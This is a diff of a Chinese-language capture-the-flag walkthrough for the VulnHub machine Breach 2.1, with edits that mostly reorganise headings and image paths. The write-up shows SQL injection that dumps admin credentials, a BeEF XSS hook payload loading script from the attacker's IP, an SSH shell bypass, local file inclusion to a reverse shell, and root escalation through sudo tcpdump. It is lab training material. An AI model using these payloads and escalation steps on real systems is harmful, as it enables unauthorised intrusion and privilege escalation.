@@ -1,15 +1,23 @@
 ---
 title: Breach2.1
+tags:
+  - VulnHub
+  - Linux
+  - Hard
+  - Breach
 pagination_prev: null
 pagination_next: null
 ---
 
 - 靶机链接:https://www.vulnhub.com/entry/breach-21,159/
-## 主机发现
+
+## 信息收集
+
+### 主机发现
 这台靶机设置了静态ip（192.168.110.151）
 所以打之前要把自己的机器设置到相同的C段
-## 端口扫描
-### 全端口扫描
+### 端口扫描
+#### 全端口扫描
 - 注意这里的80一开始是扫不到的，在ssh连接peter并使用密码inthesource后才会开放
 ~~~
 ┌──(kali㉿kali)-[~/breach]
@@ -30,7 +38,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
 
 ~~~
-### 默认脚本扫描
+#### 默认脚本扫描
 ~~~
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sT -sV -sC -p80,111,39250,65535 192.168.110.151 -oA nmap/sC                  
@@ -66,7 +74,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
 ~~~
-### 漏洞脚本扫描
+#### 漏洞脚本扫描
 ~~~
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sT -sV --script=vuln -p111,39250,65535 192.168.110.151 -oA nmap/vuln
@@ -90,7 +98,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 50.79 seconds
 
 ~~~
-### UDP扫描
+#### UDP 扫描
 ~~~
 ┌──(kali㉿kali)-[~/breach]
 └─$ sudo nmap -sU --top-ports 20 192.168.110.151 -oA nmap/UDP            
@@ -125,76 +133,79 @@ Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
 
 ~~~
 
-## 65535(OpenSSH 6.7p1)
-![](./Pasted image 20241026224233.png)
+### 65535 端口 OpenSSH 6.7p1
+![](./Pasted_image_20241026224233.png)
 存在用户名枚举，暂时搁置
 尝试连接一下，看有什么信息
-![](./Pasted image 20241027162443.png)
+![](./Pasted_image_20241027162443.png)
 有用户名peter，使用密码inthesource登录
-![](./Pasted image 20241029144810.png)
+![](./Pasted_image_20241029144810.png)
 连接被关闭，可见密码是正确的
-## 111(RPCbind)
+### 111 端口 RPCbind
 看起来并没有启动nfs和nis服务，showmount也证明了服务没有开启
-## 80(web)
-![](./Pasted image 20241027171612.png)
+
+## 漏洞利用
+
+### 80 端口 Web 初始访问
+![](./Pasted_image_20241027171612.png)
 查看一下源码，没有什么信息
-![](./Pasted image 20241027171645.png)
+![](./Pasted_image_20241027171645.png)
 进行一下目录爆破吧
-![](./Pasted image 20241027171912.png)
-![](./Pasted image 20241027172054.png)
+![](./Pasted_image_20241027171912.png)
+![](./Pasted_image_20241027172054.png)
 /image目录显示forbidden
 查看一下/blog目录
-![](./Pasted image 20241027171830.png)
+![](./Pasted_image_20241027171830.png)
 访问到页面
 发现search，sqlmap一把梭发现存在sql注入
-![](./Pasted image 20241028182303.png)
+![](./Pasted_image_20241028182303.png)
 查看有哪些数据库
-![](./Pasted image 20241028182353.png)
+![](./Pasted_image_20241028182353.png)
 发现blog和oscommerce两个比较特别的数据库
 #### blog
 查看所有表
-![](./Pasted image 20241028182528.png)
+![](./Pasted_image_20241028182528.png)
 查看blogphp_users
-![](./Pasted image 20241028182619.png)
+![](./Pasted_image_20241028182619.png)
 只发现了我们自己注册的账户
 看来要去看看另外一个数据库
 #### oscommerce
-![](./Pasted image 20241028182830.png)
+![](./Pasted_image_20241028182830.png)
 发现感兴趣的osc_administrators
-![](./Pasted image 20241028182915.png)
+![](./Pasted_image_20241028182915.png)
 拿到admin的密码hash
 看起来像是md5，先鉴别一下
-![](./Pasted image 20241028182951.png)
+![](./Pasted_image_20241028182951.png)
 大概率是md5了
-![](./Pasted image 20241028183008.png)
+![](./Pasted_image_20241028183008.png)
 拿到一组凭据admin::32admin
-![](./Pasted image 20241028183124.png)
+![](./Pasted_image_20241028183124.png)
 在blog尝试登录似乎失败了，哎，兔子洞
 再回web页面查看有什么信息
-![](./Pasted image 20241028192341.png)
+![](./Pasted_image_20241028192341.png)
 网站使用的blogphp
-![](./Pasted image 20241028192452.png)
+![](./Pasted_image_20241028192452.png)
 尝试了本地用户提权，但是就算拿到admin登录blog好像也没什么用
 只能尝试xss了
 结合主页面给的beef
-![](./Pasted image 20241028192616.png)
+![](./Pasted_image_20241028192616.png)
 我们使用beef-xss进行利用
 查看exp
-![](./Pasted image 20241028193353.png)
+![](./Pasted_image_20241028193353.png)
 构造payload
 ~~~
 <script src="http://192.168.110.128:3000/hook.js"></script>
 ~~~
-![](./Pasted image 20241028195216.png)
+![](./Pasted_image_20241028195216.png)
 访问members.html即可触发
-![](./Pasted image 20241028201427.png)
+![](./Pasted_image_20241028201427.png)
 可以发现左侧靶机的ip上线
 发现了一篇精彩的[文章](https://phreaklets.blogspot.com/2014/04/using-beef-metasploit-to-pop-shell-with.html)，展示了利用msf+beef进行反弹shell
 但是这里我的BeEF迟迟收不到上线的消息，所以干脆在register.html中注入我的payload
-![](./Pasted image 20241029144111.png)
-![](./Pasted image 20241029144143.png)
+![](./Pasted_image_20241029144111.png)
+![](./Pasted_image_20241029144143.png)
 收到如图的返回说明session已经建立，用session -i 1 连接（这里的session可能会断，等下一次就好）
-![](./Pasted image 20241029144332.png)
+![](./Pasted_image_20241029144332.png)
 成功拿到shell，这里要去想一下我们的ssh连接为什么会被关闭
 在/etc/ssh/sshd_config文件中发现
 ~~~
@@ -205,9 +216,9 @@ AddressFamily inet
 ~~~
 可以用`echo "exec sh" > ~/.bashrc`绕过
 再次连接ssh
-![](./Pasted image 20241029145247.png)
+![](./Pasted_image_20241029145247.png)
 成功拿到立足点
-## 提权枚举
+## 权限提升
 ### 升级终端
 提升一下交互性
 ~~~
@@ -215,55 +226,55 @@ export TERM=xterm
 ~~~
 ### 信息枚举
 在/var/www/html/blog/config.php中找到mysql的登录凭据
-![](./Pasted image 20241029152649.png)
+![](./Pasted_image_20241029152649.png)
 似乎用处不大，暂时保留
 sudo -l
-![](./Pasted image 20241029192057.png)
+![](./Pasted_image_20241029192057.png)
 没有修改配置文件和设置LD_PRELOAD的权限
 靠apache2提权只能暂时搁置
 cat /etc/passwd
-![](./Pasted image 20241029192306.png)
+![](./Pasted_image_20241029192306.png)
 有用户peter、milton、blumbergh
 `netstat -tlnp`查看监听中的端口
-![](./Pasted image 20241029192612.png)
+![](./Pasted_image_20241029192612.png)
 2323似乎是没有扫出来的，看一下开启的是什么服务
 `gerp -rl 2323 /etc  2>/dev/null`
-![](./Pasted image 20241029192833.png)
-![](./Pasted image 20241029192855.png)
+![](./Pasted_image_20241029192833.png)
+![](./Pasted_image_20241029192855.png)
 开启的是telnet服务，尝试连接
-![](./Pasted image 20241029192949.png)
+![](./Pasted_image_20241029192949.png)
 给了一个经纬度地址，google一下
-![](./Pasted image 20241029193032.png)
+![](./Pasted_image_20241029193032.png)
 定位到了休斯顿
 尝试下其他用户登录
 发现milton::Houston可以登录，得到提示Whose stapler is it（也出现过在web页面）
-![](./Pasted image 20241029193141.png)
+![](./Pasted_image_20241029193141.png)
 查找一下stapler
-![](./Pasted image 20241029194119.png)
-![](./Pasted image 20241029194301.png)
+![](./Pasted_image_20241029194119.png)
+![](./Pasted_image_20241029194301.png)
 回答mine
-![](./Pasted image 20241029194531.png)
+![](./Pasted_image_20241029194531.png)
 我们变成milton了！
 发现又多了一个8888端口
-![](./Pasted image 20241029200248.png)
+![](./Pasted_image_20241029200248.png)
 看一下8888是什么服务
-![](./Pasted image 20241029200415.png)
+![](./Pasted_image_20241029200415.png)
 似乎是nginx
 从浏览器访问发现确实是nginx
-![](./Pasted image 20241029200520.png)
+![](./Pasted_image_20241029200520.png)
 是之前发现的oscommerce
 在milton的身份下发现无法在这里新建文件，只能利用oscommerce本身的漏洞了
-![](./Pasted image 20241029200910.png)
+![](./Pasted_image_20241029200910.png)
 查看有文件本地包含漏洞
-![](./Pasted image 20241029202145.png)
+![](./Pasted_image_20241029202145.png)
 查看有漏洞的文件，发现会先加一个.php后缀
-![](./Pasted image 20241029203339.png)
+![](./Pasted_image_20241029203339.png)
 新建一个/tmp/shell.php
-![](./Pasted image 20241029205307.png)
-![](./Pasted image 20241029204658.png)
+![](./Pasted_image_20241029205307.png)
+![](./Pasted_image_20241029204658.png)
 我们得到了另一个用户的身份
 反弹一个shell
-![](./Pasted image 20241029205759.png)
+![](./Pasted_image_20241029205759.png)
 终于我们可以愉快的提权了
 tcpdump中有两个参数-z和-Z，前者用来执行一个脚本，后者用来指定tcpdump以哪个用户运行，当可以通过sudo执行时，则可以指定以root用户运行一个脚本，从而提权
 编写提权脚本
@@ -275,6 +286,6 @@ chmod +sx /tmp/rootshell
 sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exp.sh -Z root
 
 执行成功
-![](./Pasted image 20241029211226.png)
+![](./Pasted_image_20241029211226.png)
 定妆照
-![](./Pasted image 20241029211429.png)
+![](./Pasted_image_20241029211429.png)
